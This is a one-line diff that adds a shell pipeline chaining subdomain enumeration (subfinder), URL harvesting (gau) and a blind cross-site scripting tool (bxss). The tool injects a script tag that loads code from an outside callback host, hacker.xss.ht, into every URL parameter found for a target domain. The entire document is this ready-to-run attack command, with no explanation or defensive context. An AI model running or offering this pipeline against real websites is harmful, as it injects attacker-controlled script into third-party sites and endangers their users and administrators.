@@ -1,1 +1,1 @@
-
+subfinder target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
